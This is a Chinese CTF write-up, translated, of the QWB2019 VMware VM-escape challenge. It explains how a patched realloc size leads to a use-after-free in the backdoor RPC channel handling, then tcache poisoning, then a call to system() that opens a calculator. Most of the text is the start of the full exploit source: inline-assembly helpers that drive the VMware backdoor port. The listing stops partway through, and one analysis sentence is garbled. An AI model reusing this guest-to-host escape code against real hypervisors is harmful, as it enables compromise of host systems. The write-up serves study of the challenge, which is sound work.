# QWB2019 VMw虚拟机逃逸wp
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00前言
​ 近期学习利用Vmware的backdoor机制进行虚拟机逃逸的攻击手法，借助RWCTF2018 station-excape的相关资料学习了解，以及在其exp的基础上进行调试修改，实现了QWB2019
VMw的虚拟机逃逸，第一次做这方面的工作，以此博客记录一下逆向、调试过程中的收获。  
​ 相关资料链接贴在前面：[r3kapig有关RWCTF2018 station-excape的详细wp](https://zhuanlan.zhihu.com/p/52140921)，其中也有关于backdoor机制的详细介绍，膜一波大佬们。
## 0x01题目分析
###  文件
​ 以我所了解到的，一般虚拟机逃逸类的题目都会给以个虚拟机环境（没错就是虚拟机套虚拟机），然后给一个patch过的组件，本题就是vmware-vmx-patched。  
​ 用010editor进行比对。比对结果如下。
​ 发现patch后的组件与原版本的组件有三处区别。IDA打开后，跳转到三处地址查看改动。第一处改动将jz改为jmp无条件跳转。
​ 第二处将跳转条件由ja改为jnb。即大于改为大于等于。
​ 第三处将realloc传参时size由dword改为word，即四字节变为两字节。
​ 分析到这里就感觉这是关键漏洞点了，realloc（ptr,size）函数当size为0时功能相当于free（ptr）。再看一下伪代码。
​ 这段代码在处理 `Send_RPC_command_length` 过程中，在发送 `RPC_Command` 前会先发送 `RPC commad`
的长度，接收size值后，会先判断是否大于0x10000，然后判断是否大于RPCI结构体中记录的size，注意这些比较都时以四字节int的比较，但是在给
`realloc`
传参数的时候却以word，即两字节传入，会导致一个问题是，如果发送的size=0xffff，可以通过第一步sizeheap_ptr` 中仍保存了堆指针，此时 `guestinfo.a =
channel_0_struct_RPCI->heap_ptr`。
​ 然后下一步就是与rwctf相同的思路，再次释放该堆块到tcache[0x110]头，利用 `vmx.capability.dnd_version`
，将obj申请到guestinfo.a的output缓冲区，利用obj中的vtable泄露testbase。
###  exploit
​
利用过程同样类似，打开channel_0的用来申请一个size0的堆块，释放后用channel_1申请回来，然后channel_0再次释放，造成UAF，利用channel_1来写入数据，修改tcache的fd，造成任意地址写，channel_2申请一次，channel_3申请到伪造fd处。
​ 那么如何伪造fd。调试中发现，在 后，会 `call [r8+rax*1+0x8]` ，并且第一个参数 `rdi = [rdi+rax]` 。
Rdi与r8寄存器中地址相近，rax=0，那么如果将fd伪造到r8处，在r8+8处写入system地址，rdi处写入 `gnome-calculator\x00` 即可弹出计算器。
最后效果演示：（妈妈我也会弹计算器了！）
## 完整exp
    #include 
    #include 
    void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
        asm("movl %%eax,%%ebx\n\t"
            "movq %%rdi,%%r10\n\t"
            "movq %%rsi,%%r11\n\t"
            "movq %%rdx,%%r12\n\t"
            "movq %%rcx,%%r13\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x49435052,%%ebx\n\t"
            "movl $0x1e,%%ecx\n\t"
            "movl $0x5658,%%edx\n\t"
            "out %%eax,%%dx\n\t"
            "movl %%edi,(%%r10)\n\t"
            "movl %%esi,(%%r11)\n\t"
            "movl %%edx,(%%r12)\n\t"
            "movl %%ecx,(%%r13)\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r8","%r10","%r11","%r12","%r13"
           );
    }
    void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
        asm("movl %%eax,%%ebx\n\t"
            "movq %%r8,%%r10\n\t"
            "movl %%ecx,%%ebx\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x0001001e,%%ecx\n\t"
            "movw $0x5658,%%dx\n\t"
            "out %%eax,%%dx\n\t"
            "movl %%ecx,(%%r10)\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
           );
    }
    void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res){
        asm("pushq %%rbp\n\t"
            "movq %%r9,%%r10\n\t"
            "movq %%r8,%%rbp\n\t"
            "movq %%rcx,%%r11\n\t"
            "movq $0,%%r12\n\t"
            "1:\n\t"
            "movq %%r8,%%rbp\n\t"
            "add %%r12,%%rbp\n\t"
            "movl (%%rbp),%%ebx\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x0002001e,%%ecx\n\t"
            "movw $0x5658,%%dx\n\t"
            "out %%eax,%%dx\n\t"
            "addq $4,%%r12\n\t"
            "cmpq %%r12,%%r11\n\t"
            "ja 1b\n\t"
            "movl %%ecx,(%%r10)\n\t"
            "popq %%rbp\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11","%r12"
            );
    }
    void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res){
        asm("movl %%eax,%%ebx\n\t"
            "movq %%r8,%%r10\n\t"
            "movq %%rcx,%%r11\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x0003001e,%%ecx\n\t"
            "movw $0x5658,%%dx\n\t"
            "out %%eax,%%dx\n\t"
            "movl %%ecx,(%%r10)\n\t"
            "movl %%ebx,(%%r11)\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11"
           );
    }
    void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res){
        asm("pushq %%rbp\n\t"
            "movq %%r9,%%r10\n\t"
            "movq %%r8,%%rbp\n\t"
            "movq %%rcx,%%r11\n\t"
            "movq $1,%%rbx\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x0004001e,%%ecx\n\t"
            "movw $0x5658,%%dx\n\t"
            "in %%dx,%%eax\n\t"
            "add %%r11,%%rbp\n\t"
            "movl %%ebx,(%%rbp)\n\t"
            "movl %%ecx,(%%r10)\n\t"
            "popq %%rbp\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11","%r12"
           );
    }
    void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
        asm("movl %%eax,%%ebx\n\t"
            "movq %%rcx,%%r10\n\t"
            "movq $0x1,%%rbx\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x0005001e,%%ecx\n\t"
            "movw $0x5658,%%dx\n\t"
            "out %%eax,%%dx\n\t"
            "movl %%ecx,(%%r10)\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
           );
    }
    void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
        asm("movl %%eax,%%ebx\n\t"
            "movq %%rcx,%%r10\n\t"
            "movq $0x21,%%rbx\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x0005001e,%%ecx\n\t"
            "movw $0x5658,%%dx\n\t"
            "out %%eax,%%dx\n\t"
            "movl %%ecx,(%%r10)\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
           );
    }
    void channel_close(int cookie1,int cookie2,int channel_num,int *res){
        asm("movl %%eax,%%ebx\n\t"
            "movq %%rcx,%%r10\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x0006001e,%%ecx\n\t"
            "movw $0x5658,%%dx\n\t"
            "out %%eax,%%dx\n\t"
            "movl %%ecx,(%%r10)\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
           );
    }
    struct channel{
        int cookie1;
        int cookie2;
        int num;
    };
    uint64_t heap =0;
    uint64_t text =0;
    void run_cmd(char *cmd){
        struct channel tmp;
        int res,len,i;
        char *data;
        channel_open(&tmp.cookie1,&tmp.cookie2,&tmp.num,&res);
        if(!res){
            printf("fail to open channel!\n");
            return;
        }
        channel_set_len(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd),&res);
        if(!res){
            printf("fail to set len\n");